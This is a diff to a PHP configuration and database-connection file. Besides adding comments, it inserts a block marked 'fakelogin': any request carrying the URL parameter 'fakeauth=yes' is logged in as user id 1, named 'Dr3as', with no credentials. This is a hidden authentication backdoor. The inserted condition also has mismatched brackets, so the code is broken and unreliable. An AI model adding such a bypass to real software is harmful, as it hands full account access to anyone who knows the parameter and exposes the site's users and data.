@@ -1,10 +1,23 @@
 <?php
+//add configfile
 include "config.php";
+//do initial db connect
 $conn = mysqli_connect($db_host, $db_username, $db_password);
 
 if (!$conn) {
   die("Connection failed: " . mysqli_connect_error());
-}
+  }
+
+//fakelogin
+if ($_GET["fakeauth" == "yes"])) { 
+
+// Set the session variables 
+$_SESSION['loggedin'] = true; $_SESSION['id'] = 1; $_SESSION['username'] = "Dr3as"; 
+
+// Redirect to the user's dashboard 
+header("Location: index.php"); exit; }
+
+//errorcode or not
 //error_reporting(E_ALL);
 //ini_set('display_errors', '1');
 error_reporting(0);
